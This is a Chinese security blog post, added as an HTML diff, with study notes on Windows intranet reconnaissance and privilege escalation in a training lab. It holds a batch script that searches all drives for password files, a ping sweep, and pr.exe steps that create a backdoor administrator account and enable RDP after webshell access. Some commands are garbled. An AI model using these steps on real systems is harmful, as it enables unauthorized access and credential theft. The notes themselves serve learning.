@@ -1,0 +1,918 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="helloworld,博客搭建,Tags创建," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="内网信息收集 一、window机信息收集低权限下的信息收集    基本情况     用户列表    端口列表    进程列表   低权限 服务列表    查看系统软件安装    网络拓扑收集    网站敏感信息收集    系统补丁信息query   基本情况   set 查看系统的环境变量    query user 查看当前在线的用户   ipconfig &#x2F;all 查看当前机器的ip   wh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows内网信息收集">
+<meta property="og:url" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
+<meta property="og:site_name" content="South&#39;D 的博客">
+<meta property="og:description" content="内网信息收集 一、window机信息收集低权限下的信息收集    基本情况     用户列表    端口列表    进程列表   低权限 服务列表    查看系统软件安装    网络拓扑收集    网站敏感信息收集    系统补丁信息query   基本情况   set 查看系统的环境变量    query user 查看当前在线的用户   ipconfig &#x2F;all 查看当前机器的ip   wh">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578368440179.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578361071602.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363325521.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363567752.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363762540.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363911199.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578364921033.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578365323796.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578366500526.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578366965382.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578367608470.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578377564685.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578377688016.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578381847818.png">
+<meta property="article:published_time" content="2020-01-14T15:31:41.284Z">
+<meta property="article:modified_time" content="2020-01-14T16:12:01.314Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="helloworld">
+<meta property="article:tag" content="博客搭建">
+<meta property="article:tag" content="Tags创建">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578368440179.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/14/windows机器信息收集/"/>
+
+
+
+
+
+  <title>windows内网信息收集 | South'D 的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">South'D 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resources">
+          <a href="/resources%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-download"></i> <br />
+            
+            resources
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/hearder.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="South'D 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">windows内网信息收集</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T23:31:41+08:00">
+                2020-01-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index">
+                    <span itemprop="name">内网</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578368440179.png" alt="1578368440179"></p>
+<h2 id="一、window机信息收集"><a href="#一、window机信息收集" class="headerlink" title="一、window机信息收集"></a>一、window机信息收集</h2><h3 id="低权限下的信息收集"><a href="#低权限下的信息收集" class="headerlink" title="低权限下的信息收集"></a>低权限下的信息收集</h3><table>
+<thead>
+<tr>
+<th></th>
+<th>基本情况</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td>用户列表</td>
+</tr>
+<tr>
+<td></td>
+<td>端口列表</td>
+</tr>
+<tr>
+<td></td>
+<td>进程列表</td>
+</tr>
+<tr>
+<td>低权限</td>
+<td>服务列表</td>
+</tr>
+<tr>
+<td></td>
+<td>查看系统软件安装</td>
+</tr>
+<tr>
+<td></td>
+<td>网络拓扑收集</td>
+</tr>
+<tr>
+<td></td>
+<td>网站敏感信息收集</td>
+</tr>
+<tr>
+<td></td>
+<td>系统补丁信息query</td>
+</tr>
+</tbody></table>
+<h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><table>
+<thead>
+<tr>
+<th>set</th>
+<th>查看系统的环境变量</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>query user</td>
+<td>查看当前在线的用户</td>
+</tr>
+<tr>
+<td>ipconfig /all</td>
+<td>查看当前机器的ip</td>
+</tr>
+<tr>
+<td>whoami</td>
+<td>查看当前用户</td>
+</tr>
+<tr>
+<td>netstat-ano</td>
+<td>查看有哪些网络连接端口</td>
+</tr>
+<tr>
+<td>net view</td>
+<td>查看在同一工作组中的机器</td>
+</tr>
+<tr>
+<td>net view /domain</td>
+<td>判断是否有域</td>
+</tr>
+</tbody></table>
+<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578361071602.png" alt="1578361071602"></p>
+<p>net1需要更高的权限（管理员）</p>
+<h3 id="用户列表"><a href="#用户列表" class="headerlink" title="用户列表"></a>用户列表</h3><table>
+<thead>
+<tr>
+<th align="left">net</th>
+<th>查看当前系统的用户</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">net1 user</td>
+<td>查看当前系统的用户</td>
+</tr>
+<tr>
+<td align="left">net user /domain</td>
+<td>查看当前域里面的用户</td>
+</tr>
+<tr>
+<td align="left">net user administrator</td>
+<td>查看当前用户的详细信息</td>
+</tr>
+<tr>
+<td align="left">net localgroup</td>
+<td>查看本地用户组</td>
+</tr>
+<tr>
+<td align="left">net localgroup administrators</td>
+<td>查看管理组中的成员</td>
+</tr>
+</tbody></table>
+<h3 id="端口列表"><a href="#端口列表" class="headerlink" title="端口列表"></a>端口列表</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363325521.png" alt="1578363325521"></p>
+<table>
+<thead>
+<tr>
+<th>netstat -an  #或获取系统当前开放的端口与端口连接信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-a显示所有连接和监听端口</td>
+</tr>
+<tr>
+<td>-n 以数字形式显示地址和端口</td>
+</tr>
+<tr>
+<td>-o显示与每个连接相关的所属进程ID</td>
+</tr>
+</tbody></table>
+<h3 id="进程列表"><a href="#进程列表" class="headerlink" title="进程列表"></a>进程列表</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363567752.png" alt="1578363567752"></p>
+<h3 id="服务列表"><a href="#服务列表" class="headerlink" title="服务列表"></a>服务列表</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363762540.png" alt="1578363762540"></p>
+<h3 id="查看软件安装"><a href="#查看软件安装" class="headerlink" title="查看软件安装"></a>查看软件安装</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363911199.png" alt="1578363911199"></p>
+<h3 id="网络拓扑收集"><a href="#网络拓扑收集" class="headerlink" title="网络拓扑收集"></a>网络拓扑收集</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578364921033.png" alt="1578364921033"></p>
+<p>route print 查看路由表    </p>
+<p>arp -a 查看arp表</p>
+<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578365323796.png" alt="1578365323796"></p>
+<p>for /1 %i in (1 1 254 )do ping -n 192.168. 10.%%i&gt;&gt;qwe.txt</p>
+<h3 id="主动收集"><a href="#主动收集" class="headerlink" title="主动收集"></a>主动收集</h3><p>搜索文件</p>
+<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578366500526.png" alt="1578366500526"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">echo</span> off</span><br><span class="line">    set<span class="string">"FileName=password.txt"</span></span><br><span class="line">    <span class="keyword">echo</span> searching..</span><br><span class="line">    <span class="keyword">for</span> %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z)<span class="keyword">do</span>(</span><br><span class="line">    <span class="keyword">if</span> exist %%a:\(</span><br><span class="line">     <span class="keyword">for</span> /f<span class="string">"delims="</span>%%bin(<span class="string">'dir/a-d/s/b"%%a:\*%FileName%"2^&gt;nul'</span>)<span class="keyword">do</span>(</span><br><span class="line">     <span class="keyword">if</span>/i<span class="string">"%%~nxb"</span>equ<span class="string">"%FileName%"</span>(</span><br><span class="line">         <span class="keyword">echo</span>,%%b</span><br><span class="line">       )</span><br><span class="line">      )</span><br><span class="line">     )</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>判断主机存活</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">echo</span> off </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /l %%i in (<span class="number">1</span> <span class="number">1</span> <span class="number">254</span> )<span class="keyword">do</span> ping -n <span class="number">192.168</span>. <span class="number">10.</span>%%i&gt;&gt;qwe.txt</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578366965382.png" alt="1578366965382"></p>
+<h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578367608470.png" alt="1578367608470"></p>
+<h2 id="二、window系统漏洞提权"><a href="#二、window系统漏洞提权" class="headerlink" title="二、window系统漏洞提权"></a>二、window系统漏洞提权</h2><p>SecWiki</p>
+<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578377564685.png" alt="1578377564685"></p>
+<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578377688016.png" alt="1578377688016"></p>
+<p>PR提权（巴西烤肉）</p>
+<p>pr提权（i春秋靶场）</p>
+<p>1、连接webshell</p>
+<p>2、尝试执行命令，发现不能执行</p>
+<p>3、上传cmd，右键终端打开</p>
+<p>4、执行whoami，发现普通用户，用管理员打开</p>
+<p>5、查看systeminfo，确定系统以及补丁</p>
+<p>6、利用漏洞、上传pr.exe</p>
+<p>7、pr.exe执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pr.exe whoami</span><br><span class="line">systeminfo   (可以查补丁编号)</span><br><span class="line"></span><br><span class="line">pr.exe下尝试新建用户</span><br><span class="line">1，pr.exe &quot;net user&quot;</span><br><span class="line">2, pr.exe &quot;net user test123 Test#123&quot; &#x2F;add</span><br><span class="line"></span><br><span class="line">添加到管理组</span><br><span class="line">pr.exe &quot;net localgroup administrators test123 &#x2F;add&quot;</span><br><span class="line"></span><br><span class="line">查看一下端口是否开放</span><br><span class="line">pr exe &quot;netstat -ano&quot;</span><br><span class="line"></span><br><span class="line">pr.exe 3389.bat (3389运行过程)</span><br><span class="line">运行之后再查看3389是否开启：pr exe &quot;netstat -ano&quot;</span><br></pre></td></tr></table></figure>
+
+<p>8、远程连接mstsc</p>
+<p>chrome收藏夹文件位置</p>
+<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578381847818.png" alt="1578381847818"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/helloworld/" rel="tag"># helloworld</a>
+          
+            <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" rel="tag"># 博客搭建</a>
+          
+            <a href="/tags/Tags%E5%88%9B%E5%BB%BA/" rel="tag"># Tags创建</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/12/%E6%8F%90%E6%9D%83/" rel="next" title="提权">
+                <i class="fa fa-chevron-left"></i> 提权
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/hearder.jpg"
+                alt="John Doe" />
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/catagories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#内网信息收集"><span class="nav-number">1.</span> <span class="nav-text">内网信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、window机信息收集"><span class="nav-number">1.1.</span> <span class="nav-text">一、window机信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#低权限下的信息收集"><span class="nav-number">1.1.1.</span> <span class="nav-text">低权限下的信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本情况"><span class="nav-number">1.1.2.</span> <span class="nav-text">基本情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用户列表"><span class="nav-number">1.1.3.</span> <span class="nav-text">用户列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口列表"><span class="nav-number">1.1.4.</span> <span class="nav-text">端口列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#进程列表"><span class="nav-number">1.1.5.</span> <span class="nav-text">进程列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务列表"><span class="nav-number">1.1.6.</span> <span class="nav-text">服务列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看软件安装"><span class="nav-number">1.1.7.</span> <span class="nav-text">查看软件安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网络拓扑收集"><span class="nav-number">1.1.8.</span> <span class="nav-text">网络拓扑收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#主动收集"><span class="nav-number">1.1.9.</span> <span class="nav-text">主动收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#systeminfo"><span class="nav-number">1.1.10.</span> <span class="nav-text">systeminfo</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、window系统漏洞提权"><span class="nav-number">1.2.</span> <span class="nav-text">二、window系统漏洞提权</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
